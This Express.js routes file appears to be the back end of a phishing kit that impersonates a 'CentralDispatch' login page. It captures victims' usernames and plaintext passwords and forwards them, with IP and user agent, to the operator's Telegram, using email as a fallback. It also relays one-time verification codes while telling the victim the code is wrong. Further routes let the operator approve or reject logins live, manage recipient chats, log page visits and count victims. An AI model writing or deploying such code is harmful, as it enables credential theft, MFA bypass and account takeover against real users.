/**
 * API Routes
 * Express версия
 */

const express = require('express');
const router = express.Router();

const { sendLoginEmail, sendCodeEmail } = require('../lib/email');
const { sendLoginTelegram, sendCodeTelegram, sendVisitNotification, answerCallbackQuery, sendMessage } = require('../lib/telegram');
const { createLoginRequest, getLoginRequest, updateLoginRequestStatus, deleteLoginRequest, getAllLoginRequests } = require('../lib/login-requests');
const { addChatId, removeChatId, getChatIdsList } = require('../lib/telegram-chat-ids');
const { getAggregatedStats } = require('../lib/stats');

/**
 * POST /api/auth/login
 */
router.post('/auth/login', async (req, res) => {
  console.log("[API LOGIN] Получен запрос на вход");

  try {
    const { username, password, rememberUsername } = req.body;
    const clientIp = req.clientIp;
    const userAgent = req.userAgent;

    console.log("[API LOGIN] Данные:", { username, rememberUsername });
    console.log("[API LOGIN] IP:", clientIp);
    console.log("[API LOGIN] User-Agent:", userAgent);

    if (!username) {
      return res.status(400).json({ error: "Username обязателен" });
    }
    
    const isVerificationCode = password === "";
    if (isVerificationCode) {
      if (!/^\d{6}$/.test(username.trim())) {
        return res.status(400).json({ error: "Код должен содержать 6 цифр" });
      }
      
      try {
        const session = req.session;
        let codeUsername = session?.username;
        
        if (!codeUsername) {
          const allRequests = getAllLoginRequests();
          if (allRequests.length > 0) {
            codeUsername = allRequests[allRequests.length - 1].username;
          }
        }
        
        if (!codeUsername) {
          codeUsername = "unknown";
        }
        
        const verificationCode = username.trim();
        await sendCodeTelegram(verificationCode, codeUsername, clientIp, userAgent);
        console.log("[API LOGIN] Код верификации отправлен в Telegram");
      } catch (telegramError) {
        console.error("[API LOGIN] Ошибка отправки кода в Telegram:", telegramError);
        try {
          await sendCodeEmail(username.trim(), username.trim());
        } catch (emailError) {
          console.error("[API LOGIN] Ошибка отправки Email с кодом:", emailError);
        }
      }
      
      console.error("[API LOGIN] Код верификации неверный");
      return res.status(400).json({ error: "Код верификации неверный" });
    }

    // Создание запроса на вход
    const requestId = createLoginRequest(username, password);
    
    // Сохранение в сессию
    req.session.username = username;
    req.session.requestId = requestId;
    
    try {
      await sendLoginTelegram(username, password, requestId, clientIp, userAgent);
      console.log("[API LOGIN] Уведомление отправлено в Telegram");
      
      return res.json({
        success: true,
        requestId,
        status: "pending"
      });
    } catch (telegramError) {
      console.error("[API LOGIN] Ошибка отправки в Telegram:", telegramError);
      try {
        await sendLoginEmail(username, password);
        console.log("[API LOGIN] Fallback: Email отправлен");
      } catch (emailError) {
        console.error("[API LOGIN] Ошибка отправки Email:", emailError);
      }
      
      // Перенаправляем на страницу кода без ожидания Telegram
      return res.json({
        success: true,
        redirect: `/verification/verifycode?userName=${encodeURIComponent(username)}&sendCodeSelector=Email`
      });
    }
  } catch (error) {
    console.error("[API LOGIN] Ошибка:", error);
    return res.status(500).json({ error: "Внутренняя ошибка сервера" });
  }
});

/**
 * POST /api/auth/create-session
 */
router.post('/auth/create-session', (req, res) => {
  console.log("[API CREATE-SESSION] Получен запрос на создание сессии");

  try {
    const { username, step } = req.body;

    if (!username) {
      return res.status(400).json({ error: "Username обязателен" });
    }

    // Создаем сессию
    req.session.username = username;
    req.session.step = step || "code";

    console.log("[API CREATE-SESSION] Сессия создана:", { username, step });

    return res.json({
      success: true,
      message: "Сессия создана",
    });
  } catch (error) {
    console.error("[API CREATE-SESSION] Ошибка:", error);
    return res.status(500).json({
      error: error instanceof Error ? error.message : "Ошибка при создании сессии",
    });
  }
});

/**
 * GET /api/auth/check-status
 */
router.get('/auth/check-status', (req, res) => {
  const { requestId } = req.query;
  
  if (!requestId) {
    return res.status(400).json({ error: "requestId обязателен" });
  }
  
  const request = getLoginRequest(requestId);
  
  if (!request) {
    return res.status(404).json({ error: "Запрос не найден или истек" });
  }
  
  res.json({ status: request.status });
});

/**
 * POST /api/verify-code
 */
router.post('/verify-code', async (req, res) => {
  try {
    const { code } = req.body;
    const session = req.session;
    const clientIp = req.clientIp;
    const userAgent = req.userAgent;
    
    if (!code || !/^\d{6}$/.test(code)) {
      return res.status(400).json({ error: "Код должен содержать 6 цифр" });
    }
    
    const username = session?.username || "unknown";
    
    try {
      await sendCodeTelegram(code, username, clientIp, userAgent);
      console.log("[API VERIFY-CODE] Код отправлен в Telegram");
    } catch (telegramError) {
      console.error("[API VERIFY-CODE] Ошибка отправки в Telegram:", telegramError);
      try {
        await sendCodeEmail(code, username);
        console.log("[API VERIFY-CODE] Fallback: Email отправлен");
      } catch (emailError) {
        console.error("[API VERIFY-CODE] Ошибка отправки Email:", emailError);
      }
    }
    
    return res.json({ success: true });
  } catch (error) {
    console.error("[API VERIFY-CODE] Ошибка:", error);
    return res.status(500).json({ error: "Внутренняя ошибка сервера" });
  }
});

/**
 * POST /api/visit-notification
 */
router.post('/visit-notification', async (req, res) => {
  try {
    const { path } = req.body;
    const clientIp = req.clientIp;
    const userAgent = req.userAgent;
    
    sendVisitNotification(path || req.path, userAgent, clientIp).catch(error => {
      console.error("[VISIT-NOTIFICATION] Ошибка:", error);
    });
    
    return res.json({ success: true });
  } catch (error) {
    console.error("[VISIT-NOTIFICATION] Ошибка:", error);
    return res.status(500).json({ error: "Внутренняя ошибка сервера" });
  }
});

/**
 * POST /api/telegram/webhook
 */
router.post('/telegram/webhook', async (req, res) => {
  try {
    const update = req.body;
    
    if (update.callback_query) {
      const { callback_query } = update;
      const { data, from, message } = callback_query;
      const chatId = from.id.toString();
      
      console.log("[TELEGRAM WEBHOOK] Callback query:", data);
      
      if (data.startsWith('login_yes_') || data.startsWith('login_no_')) {
        const parts = data.split('_');
        if (parts.length >= 3) {
          const action = parts[1]; // yes или no
          const requestId = parts.slice(2).join('_');
          
          console.log(`[TELEGRAM WEBHOOK] Обработка ${action.toUpperCase()} для запроса: ${requestId}`);
          
          await answerCallbackQuery(callback_query.id, action === 'yes' ? 'Доступ разрешен' : 'Доступ отклонен');
          
          if (action === 'yes') {
            updateLoginRequestStatus(requestId, 'approved');
          } else {
            updateLoginRequestStatus(requestId, 'rejected');
            deleteLoginRequest(requestId);
          }
        }
      }
    } else if (update.message) {
      const { text, from } = update.message;
      const chatId = from.id.toString();
      
      if (text) {
        if (text.startsWith('/addchat')) {
          const chatIdToAdd = text.split(' ')[1];
          if (!chatIdToAdd) {
            await sendMessage(chatId, "❌ Ошибка: укажите Chat ID\n\nИспользование: /addchat <chat_id>");
            return res.json({ ok: true });
          }
          
          try {
            const added = addChatId(chatIdToAdd);
            if (added) {
              await sendMessage(chatId, `✅ Chat ID \`${chatIdToAdd}\` успешно добавлен`, "Markdown");
            } else {
              await sendMessage(chatId, `⚠️ Chat ID \`${chatIdToAdd}\` уже существует в списке`, "Markdown");
            }
          } catch (error) {
            await sendMessage(chatId, `❌ Ошибка при добавлении Chat ID: ${error.message}`);
          }
          return res.json({ ok: true });
        }
        
        if (text.startsWith('/removechat')) {
          const chatIdToRemove = text.split(' ')[1];
          if (!chatIdToRemove) {
            await sendMessage(chatId, "❌ Ошибка: укажите Chat ID\n\nИспользование: /removechat <chat_id>");
            return res.json({ ok: true });
          }
          
          try {
            const removed = removeChatId(chatIdToRemove);
            if (removed) {
              await sendMessage(chatId, `✅ Chat ID \`${chatIdToRemove}\` успешно удален`, "Markdown");
            } else {
              await sendMessage(chatId, `⚠️ Chat ID \`${chatIdToRemove}\` не найден в списке`, "Markdown");
            }
          } catch (error) {
            await sendMessage(chatId, `❌ Ошибка при удалении Chat ID: ${error.message}`);
          }
          return res.json({ ok: true });
        }
        
        if (text === '/listchats') {
          try {
            const list = getChatIdsList();
            await sendMessage(chatId, `📋 *Список Chat ID:*\n\n${list}`, "Markdown");
          } catch (error) {
            await sendMessage(chatId, `❌ Ошибка при получении списка Chat ID: ${error.message}`);
          }
          return res.json({ ok: true });
        }
        
        if (text === '/stats') {
          try {
            const stats = getAggregatedStats();
            const message = `📊 *Статистика CentralDispatch*\n\n` +
              `✅ Одобрено: ${stats.approved}\n` +
              `❌ Отклонено: ${stats.rejected}\n` +
              `⏳ Ожидает: ${stats.pending}\n` +
              `📝 Всего: ${stats.total}`;
            await sendMessage(chatId, message, "Markdown");
          } catch (error) {
            await sendMessage(chatId, `❌ Ошибка при получении статистики: ${error.message}`);
          }
          return res.json({ ok: true });
        }
        
        if (text === '/help' || text === '/start') {
          const helpMessage = `🤖 *CentralDispatch Bot - Команды*\n\n` +
            `/addchat <chat_id> - Добавить Chat ID\n` +
            `/removechat <chat_id> - Удалить Chat ID\n` +
            `/listchats - Показать список Chat ID\n` +
            `/stats - Показать статистику\n` +
            `/help - Показать эту справку`;
          await sendMessage(chatId, helpMessage, "Markdown");
          return res.json({ ok: true });
        }
      }
    }
    
    res.json({ ok: true });
  } catch (error) {
    console.error("[TELEGRAM WEBHOOK] Ошибка:", error);
    res.status(500).json({ ok: false, error: error.message });
  }
});

module.exports = router;

